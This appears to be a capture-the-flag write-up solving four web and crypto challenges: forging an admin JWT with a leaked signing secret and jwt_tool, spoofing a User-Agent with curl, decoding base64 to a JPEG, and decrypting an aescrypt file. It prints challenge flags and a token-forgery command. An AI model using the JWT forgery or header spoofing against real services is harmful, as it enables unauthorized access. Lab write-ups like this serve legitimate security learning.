**Web: Jasons Baking Services**
First, i will analyze the code, in the `router.js` i found.
```
route.get('/flag', authenticateJson, (req, res) => {
    if (!req.user) {
        res.render('index')
    } else {
        if (req.user.admin == true) {
            res.send("// Print Flag Here")
        } else {
            res.render('dashboard', {name: req.user.name})
        }
    }

```
If i register with a user, the platform will generate an access token for which was the `jwt`.
```
        if (user) {
            bcrypt
                .compare(req.body.password, user.Password, function (err, result) {
                    if (result) {
                        const user = {
                            name: username,
                            authorized: true,
                            admin: false
                        }
                        const accessToken = generateAccessToken(user)
                        req.session.username = username
```
in `the config.env` i found the secret key which sign the `jwt`. 
`SECRET=y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa`. Now i will register and then tamper my jwt using Jwt tool
I intercepted it with burp and see the jwt, i change the admin false to True, I will tamper it now.
```
└─# python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYmxvaGFja2VyIiwiYXV0aG9yaXplZCI6dHJ1ZSwiYWRtaW4iOmZhbHNlLCJpYXQiOjE2OTg3NzE4MTksImV4cCI6MTY5ODc3MjExOX0.C2qPzFUdBoDcMVbMzqCZGn8N2gcaOR7S1NJZARUHdQA -T -p y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa -S hs256
```
or use this : http://jwt.io/
Then just change cookie on burp. and got flag.

**Web: Aliens Make Me Wanna Curl**
We are expecting communications from an artificial intelligence device called MU-TH-UR 6000, referred to as mother by the crew. We disabled the login page and implemented a different method of authentication. The username is mother and the password is ovomorph. To ensure security, only mothers specific browser is allowed.
Here i need to use curl to get the flag.
` curl -u mother:ovomorph -H "User-Agent: MU-TH-UR 6000"  https://spooky-aliens-make-me-wanna-curl-web.chals.io/flag          
NICC{dOnt_d3pEnD_On_h3AdeRs_4_s3eCu1ty}`

**Crypto: What have we found here...**
I found a lot of base64 in file, i tried cyberchef but size is limited,
Then i tried,
```
base64 -d file.txt | less
<FF><D8><FF><E0>^@^PJFIF^@^A^A^A^@`^@`^@^@<FF><DB>^@C^@^C^B^B^C^B^B^C^C^C^C^D^C^C^D^E^H^E^E^D^D^E
```
i found JFIF, i think it's a picture, i will decode into a jpeg/
```
└─# base64 -d found.txt > flag.jpg
file flag.jpg
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 1080x1077, components 3

```
Opened image and found the flag.`NICC{Just_chillin}`
**Crypto: If the key fits...**
I am trying to escape this 64-story horror house and the only way to escape is by finding the flag in this text file! Can you help me crack into the file and get the flag? The only hint I get is this random phrase: `MWwwdjM1eW1tM3RyMWNrM3Q1ISEh`
When i decoded this from base64, i found `1l0v35ymm3tr1ck3t5!!!`, but it's the incorrect flag.
Ok, So now i cat the   `flag.txt.aes` and found this shit:
```
AES&CREATED_BYaescrypt (Windows GUI) 3.10�}�ܟ_pp׏����Ƃ����\���P͝�f#��8F�cZa��F�u���z�
             ���V�v��C����/Q�^bp�it9?
                                     ��/�Z�:'��u1��
                                                   eXh��2g�'�J��z2 �w{D%���J{)�i�L�
��9M���@l�z&�$a�n?��&�7��z��    b��o< 
```
using the name encoded `CREATED BY aescrypt`I found a tool named aescryt: https://www.aescrypt.com/linux_aes_crypt.html
The i use the password: `1l0v35ymm3tr1ck3t5!!!` to decode it and find flag.txt
```
└─# cat flag.txt
Congrats on finding the flag!

NICC{1-4m-k3yn0ugh!} 

```